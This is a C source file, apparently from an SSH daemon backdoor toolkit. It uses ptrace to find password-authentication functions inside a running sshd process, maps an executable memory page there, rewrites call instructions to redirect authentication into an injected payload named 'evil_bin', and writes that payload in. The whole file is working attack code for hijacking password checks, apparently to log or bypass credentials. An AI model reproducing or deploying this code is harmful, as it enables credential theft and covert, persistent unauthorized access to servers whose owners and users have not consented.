#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <inject.h>
#include <sig.h>
#include <common.h>
#include <callcache.h>
#include <util.h>
#include <ptrace.h>

extern unsigned char hook_passlog_bin[];
extern int hook_passlog_bin_len;

void backdoor_password_install(inject_ctx *ctx) {
	u8 privsep_jnz[2]={0,0};

	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
	u64 auth_password=0, mm_auth_password=0;
	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
	int i, n_auth_password_calls, n_mm_auth_password_calls;
	u64 diff=0, hole_addr=0;
	u8 *evil_bin;
	u32 use_privsep_val=0;

	evil_bin = malloc(hook_passlog_bin_len);
	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);

	u64 *import_table = (u64*)(evil_bin + 8);

	use_privsep = resolve_symbol_tab(ctx, "use_privsep");

	if (use_privsep == 0) {
		error("could not locate use_privsep :(");
	}

	info("found use_privsep\t\t= 0x%llx", use_privsep);

	logit_passchange = lea_by_debugstr(
		ctx, LEA_RDI, "password change not supported"
	);

	info("logit(\"password change..\")\t= 0x%llx", logit_passchange);

	privsep_load = find_prev_load(ctx, LOAD_LEA, LEA_RAX, logit_passchange, use_privsep);
	
	// load instruction wasn't a lea, search for mov rax, privsep_ptr
	if (privsep_load == 0) {
		u64 privsep_ptr = 0x0, *ptr = (u64 *)ctx->got;
		int i;
		
		// loop over all pointers in the .got
		for (i = 0; i < (ctx->got_sz / sizeof(u64)); i++) {
			// find the entry that points to use_privsep
			if (ptr[i] == (use_privsep - ctx->elf_base)) {
				privsep_ptr = ctx->elf_base + ctx->got_base + (i * sizeof(u64));
				break;				
			}
		}
	
		if (privsep_ptr == 0)
			error("could not find privsep.");
	
		privsep_load = find_prev_load(ctx, LOAD_MOV, LEA_RAX, 
									 logit_passchange, privsep_ptr);
									 
		info("mov rax, privsep_ptr\t= 0x%llx", privsep_load);
	} else {
		info("lea rax, privsep\t\t= 0x%llx", privsep_load);
	}

	privsep_test = find_next_opcode(ctx, privsep_load, (u8*)"\x85\xc0", 2);
	info("privsep test\t\t= 0x%llx", privsep_test);

	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);

	if (privsep_jnz[0] != 0x75) {
		error("wtf du0d.. the next insn is not a jnz.. wtf..");
		exit(-1);
	}

	auth_password = resolve_call_insn(ctx, privsep_test+4);
	info("auth_password\t\t= 0x%llx", auth_password);

	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
	
	n_auth_password_calls = find_calls(&auth_password_calls, auth_password);
	n_mm_auth_password_calls = find_calls(&mm_auth_password_calls, mm_auth_password);
	
	if (n_auth_password_calls == 0)
		error("No calls to auth_password found.");
	
	if (n_mm_auth_password_calls == 0)
		error("No calls to mm_auth_password found.");
	
	hole_addr = find_hole(ctx, auth_password_calls[0], 0x1000);
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	info2("entering critical phase");
	
	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);
	
	if (use_privsep_val) {
		// Patch mm_auth_password
		for (i = 0; i < n_mm_auth_password_calls; i++) {
			diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				mm_auth_password_calls[i], hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
		}
	} else {
		// Patch auth_password
		for (i = 0; i < n_auth_password_calls; i++) {
			diff = 0x100000000-(auth_password_calls[i]-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				auth_password_calls[i], hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
		}
	}

	import_table[0] = ctx->config_addr;
	import_table[1] = auth_password;
	import_table[2] = mm_auth_password;
	import_table[3] = use_privsep;

	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
	info("poked evil_bin to 0x%lx.", hole_addr);
	
	free(mm_auth_password_calls);
	free(auth_password_calls);
}
